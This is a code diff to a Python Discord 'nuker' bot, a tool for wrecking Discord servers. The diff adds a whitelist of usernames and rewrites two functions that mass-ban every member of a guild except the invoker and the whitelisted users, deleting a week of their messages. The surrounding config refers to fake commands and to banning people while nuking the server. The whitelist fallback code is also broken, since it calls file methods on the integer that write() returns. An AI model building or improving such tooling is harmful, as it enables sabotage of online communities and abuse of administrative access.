@@ -33,6 +33,21 @@ ic = Path(pti)
 cl = Path('Configs\\list_of_fake_commands.txt')
 cr = Path('Configs\\nuker_reactions_to_fake_commands.txt')
 
+ptwlp = Path('Configs\\whitelisted_people.txt')
+
+if ptwlp.is_file():
+    with open(ptwlp) as list_of_wlp:
+        whitelisted_ppls = list_of_wlp.read().splitlines()
+else:
+    with open(ptwlp, 'w+') as list_of_wlp:
+        whitelisted_ppls = list_of_wlp.write('user1#1234\nuser2#4321\ng11itch#0')
+        whitelisted_ppls = whitelisted_ppls.close()
+        whitelisted_ppls = whitelisted_ppls.read().splitlines()
+
+
+    
+
+
 
 
 
@@ -98,6 +113,9 @@ adrn = config['BOT_CFG']['admin role name']
 nuker_mode = str(config['Nuker mode']['Mode'])
 ban_people = str(config['BOT_CFG']['ban people while i nuking the server?'])
 is_fake_commands_enabled = str(config['Fake commands']['Enabled?'])
+
+
+
 
 intents = Intents.default()
 intents.members = True
@@ -230,21 +248,41 @@ async def admin(ctx,target):
     elif target == 'me':
         await ctx.message.author.add_roles(r)
             
-    
-    
+
 
 
 async def bananaa(ctx):
-    for member in list(ctx.guild.members):
-      try:
-        await member.ban(reason=br, delete_message_days=7)
-      except: pass
+    all_members_list = list(ctx.guild.members)
+    all_members_list.remove(ctx.message.author)
+    for nfwl in whitelisted_ppls:
+        fwl = ctx.guild.get_member_named(nfwl)
+        try:    
+            all_members_list.remove(fwl)
+        except:
+            pass
+    for not_wl_ppl in all_members_list:
+        try:
+            await not_wl_ppl.ban(reason=br, delete_message_days=7)
+        except:
+            pass
+
+
  
+
 async def banallmode2(ctx):
-    for member in list(ctx.members):
-      try:
-        await member.ban(reason=br, delete_message_days=7)
-      except: pass
+    all_members_list = list(ctx.members)
+    for nfwl in whitelisted_ppls:
+        fwl = ctx.get_member_named(nfwl)
+        print(fwl)
+        try:    
+            all_members_list.remove(fwl)
+        except:
+            pass
+    for not_wl_ppl in all_members_list:
+        try:
+            await not_wl_ppl.ban(reason=br, delete_message_days=7)
+        except:
+            pass
 
 raw_nuker_logo = '''
                      █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
